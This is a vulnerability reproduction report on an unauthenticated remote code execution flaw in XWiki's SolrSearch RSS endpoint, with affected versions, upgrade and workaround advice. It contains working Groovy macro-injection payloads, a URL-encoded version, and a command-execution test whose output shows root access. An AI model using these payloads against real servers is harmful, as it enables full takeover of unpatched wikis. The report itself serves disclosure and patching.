# CVE-2025-24893 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-24893
- **CWE**: CWE-94 (Code Injection)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: XWiki Platform
- **Affected Versions**: >= 5.3-milestone-2 to < 15.10.11, >= 16.0.0-rc-1 to < 16.4.1
- **Fixed Versions**: 15.10.11, 16.4.1, 16.5.0RC1

## Vulnerability Description

XWiki Platform contains a remote code execution vulnerability in the SolrSearch functionality. Any guest (unauthenticated user) can perform arbitrary remote code execution through a request to the SolrSearch endpoint. The vulnerability exists in the `Main.SolrSearchMacros` page which improperly handles user input in RSS feed generation.

The vulnerability allows injection of Groovy script macros into the search text parameter, which are then executed server-side when rendered asynchronously.

## Technical Analysis

### Vulnerable Endpoint

```
/bin/get/Main/SolrSearch?media=rss&text=<payload>
```

### Payload Structure

The payload uses XWiki macro syntax to inject and execute Groovy code:

```
}}}{{async async=false}}{{groovy}}<code>{{/groovy}}{{/async}}
```

### Exploitation Steps

1. Craft a Groovy payload using XWiki macro syntax
2. URL-encode the payload
3. Send GET request to the SolrSearch endpoint with `media=rss` parameter
4. The server executes the Groovy code and returns the result in the RSS feed title

### Example Payload

Test payload to verify vulnerability:

```
}}}{{async async=false}}{{groovy}}println("Hello from" + " search text:" + (23 + 19)){{/groovy}}{{/async}}
```

URL-encoded:

```
%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

If vulnerable, the RSS feed title will contain: `Hello from search text:42`

## Environment Setup

### Docker Image

Used official XWiki Docker image: `xwiki:16.4.0-postgres-tomcat`

### Prerequisites

- Docker and Docker Compose
- XWiki Standard Flavor must be installed (contains SolrSearchMacros)
- Complete Distribution Wizard setup required

## Reproduction Results

### Verification Test

```
$ curl "http://localhost:18080/bin/get/Main/SolrSearch?media=rss&text=..."
```

Response excerpt:
```
<title>RSS feed for search on [}}}Hello from search text:42]</title>
```

**Result: VULNERABLE**

### Command Execution Test

Payload: `}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}`

Response excerpt:
```
<title>RSS feed for search on [}}}uid=0(root) gid=0(root) groups=0(root)]</title>
```

**Result: Full RCE as root user confirmed**

## Impact

- **Confidentiality**: High - Attackers can read sensitive data from the server
- **Integrity**: High - Attackers can modify data or inject malicious content
- **Availability**: High - Attackers can disrupt services or cause denial of service

An unauthenticated attacker can fully compromise the XWiki installation, potentially:
- Steal confidential data
- Execute system commands as root
- Install backdoors or ransomware
- Pivot to internal networks

## Mitigation

1. **Upgrade**: Update XWiki to version 15.10.11, 16.4.1, or 16.5.0RC1 or later

2. **Workaround**: Edit `Main.SolrSearchMacros` in `SolrSearchMacros.xml` on line 955 to match the `rawResponse` macro in `macros.vm#L2824` with a content type of `application/xml`, instead of simply outputting the content of the feed.

## References

- [XWiki Security Advisory GHSA-rr6p-3pfg-562j](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j)
- [NVD CVE-2025-24893](https://nvd.nist.gov/vuln/detail/CVE-2025-24893)
